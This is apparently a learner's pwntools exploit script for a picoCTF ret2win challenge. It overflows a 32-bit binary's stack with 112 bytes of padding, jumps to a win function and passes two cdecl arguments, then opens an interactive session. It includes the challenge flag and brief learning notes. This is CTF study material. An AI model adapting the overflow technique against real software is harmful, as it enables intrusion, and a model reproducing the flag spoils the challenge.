from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

if args.REMOTE:
    exe = "/home/grwcha/grwna/.example_elf"
else:
    exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

"""
This challenge is a classic x86 calling convention argument passing ret2win challenge
The arguments to pass are:
    1st -> 0xCAFEF00D
    2nd -> 0xF00DF00D
The arguments are passed after the return address because the stack frame for a new called function is exactly after the calling function.
The 4 bytes of "A" after the return is the return address for the callee

picoCTF{argum3nt5_4_d4yZ_3c04eab0}
"""

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']

offset = 112
win = 0x8049296
first_arg = 0xCAFEF00D
second_arg = 0xF00DF00D

io = start()

payload = flat([
    b"A"*offset,
    win,
    b"A"*4,
    first_arg,
    second_arg,
])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()

"""
Things Learned:
- How to exploit cdecl convention
- pwntools automation doesnt work on remote
"""
